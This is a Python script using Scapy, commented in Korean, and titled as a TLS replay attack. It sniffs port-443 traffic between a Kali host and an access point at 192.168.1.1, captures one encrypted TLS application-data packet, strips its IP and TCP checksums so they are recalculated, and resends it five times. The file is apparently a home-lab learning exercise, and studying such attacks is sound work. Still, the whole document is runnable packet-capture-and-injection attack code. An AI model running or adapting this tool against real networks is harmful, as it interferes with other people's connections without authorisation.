#!/usr/bin/env python3
import os
import sys
import time

from scapy.all import (
    sniff, send, Raw,
    IP, TCP,
    get_if_list, get_if_addr, conf
)

# 클라이언트 IP 자동 탐색
def get_kali_ip():
    print("[*] Detecting IP...\n")
    
    # 시스템의 모든 네트워크 인터페이스 조회
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            # 내부망 대역(192.168.1.x) && AP IP(192.168.1.1) 제외
            if ip and ip.startswith("192.168.1.") and ip != "192.168.1.1":
                print(f"[+] Found: {iface} = {ip}")
                # 사용중인 인터페이스 + 내 IP
                return iface, ip
        except:
            continue
    return conf.iface, get_if_addr(conf.iface)


def replay_packet():
    global captured_packet, replay_sent
    
    if not captured_packet or replay_sent:
        return
    
    replay_sent = True
    
    # 패킷 복제 (이건 메모리 복사임 → 즉, 체크섬 값도 그대로 복사됨)
    replay_pkt = captured_packet.copy()
    # 체크섬 삭제 → Scapy가 자동 재계산
    # 이게 준내 중요함.
    # IP 체크섬 -> IP 헤더 무결성 검증용
    # TCP 체크섬 -> TCP 헤더 + payload 무결성 검증용
    # "이 패킷이 전송 중에 손상됐는지" 확인하는 검증값
    # 왜 삭제해야 하냐면 -> 체크섬 값이 그대로 복사됨 -> 
    # 하지만 현실에서는IP TTL 바뀔 수 있음, 라우팅 경로 바뀔 수 있음, 인터페이스 바뀔 수 있음, NIC offloading 있음, 커널 네트워크 스택 재처리
    # -> 패킷 구조가 미세하게 달라짐
    del replay_pkt[IP].chksum
    del replay_pkt[TCP].chksum

    # 체크섬 유지하면 발생하는 일
    # "어? 이 패킷 체크섬이 계산값이랑 다르네?" → 변조됨 → DROP
    # 즉, TCP/IP 계층에서 이미 폐기됨 TLS까지 도달도 못 함
    # Scapy는: 필드가 존재하면 → 그대로 전송 |  필드가 없으면 → 자동 계산
    # del replay_pkt[IP].chksum 의 의미 -> "Scapy야, 네가 환경 기준으로 새로 계산해라"
    
    # 결론
    # 기존 패킷 = 봉인된 소포 📦
    # 내용 복사 → 다시 보냄
    # 주소/환경 바뀌었는데 봉인 그대로 → 택배 분류기에서 튕김 ❌
    # 봉인 제거 → 새로 포장 → 정상 배송 ✅
    
    print("\n" + "="*60)
    print(">>> RAPID REPLAY (5x, 0.5sec interval) <<<")
    print("="*60)
    
    for i in range(5):
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{i+1}/5] Sending at {timestamp}...", end=" ")
        try:
            send(replay_pkt, iface=INTERFACE, verbose=0)
            print("✓")
        except Exception as e:
            print(f"✗ ({e})")
        
        if i < 4:
            time.sleep(0.5)
    
    print("="*60)
    print("[✓] Complete! Check Wireshark for RST packets")
    print("="*60)
    print("\n[*] Monitoring for 15 sec...\n")
    
    time.sleep(15)
    print("[*] Done.")

# 필터링 로직
def packet_handler(pkt):
    global captured_packet, replay_sent
    
    if captured_packet or replay_sent:
        return
    
    # 순수 데이터 패킷만 대상 (IP 패킷, TCP 세그먼트, Payload 존재)
    if IP in pkt and TCP in pkt and Raw in pkt:
        # Kali(Client)  →  AP(192.168.1.1)
        if pkt[IP].src == CLIENT_IP and pkt[IP].dst == AP_IP:
            payload = bytes(pkt[Raw].load)
            
            # 0x17 -> Application Data (TLS 암호화된 실제 데이터 패킷만 캡처) 
            # 0x14 -> ChangeCipherSpec
            # 0x15 -> Alert
            # 0x16 -> Handshake
            if len(payload) > 5 and payload[0] == 0x17:
                # 패킷 하나 저장
                captured_packet = pkt
                print(f"\n[+] Captured! Seq={pkt[TCP].seq}, Len={len(payload)}")
                print("[*] Replaying in 3 seconds...")
                # 3초 대기 후 → replay 실행
                time.sleep(3)

                # replay 실행 함수
                replay_packet()

# root 권한 체크 (raw socket 필수)
if os.geteuid() != 0:
    print("[!] Run with sudo: sudo python3", sys.argv[0])
    sys.exit(1)

print("="*60)
print("TLS Replay Attack - RAPID 5x")
print("="*60)

# 환경 자동 세팅
INTERFACE, CLIENT_IP = get_kali_ip()
AP_IP = "192.168.1.1"

print(f"Interface: {INTERFACE}")
print(f"Kali IP:   {CLIENT_IP}")
print(f"Target:    {AP_IP}")
print("="*60)

input("\nPress Enter to start...")

captured_packet = None
replay_sent = False


print(f"\n[*] Listening on {INTERFACE}...")
print(f">>> Browse to: https://{AP_IP}\n")

try:
    # 실시간 패킷 감청
    # filter 뒤에 파라미터가 BPF필터임. 커널 레벨 패킷 필터 (f"host~~ port 443")
    # BPF필터 -> 패킷이 유저 공간(Python/Scapy)으로 올라오기 전에 커널에서 미리 걸러버리는 필터
    sniff(iface=INTERFACE, filter=f"host {AP_IP} and tcp port 443", prn=packet_handler, store=0)
except KeyboardInterrupt:
    # crlt + c -> 인터럽트 and exit
    print("\n[!] Stopped")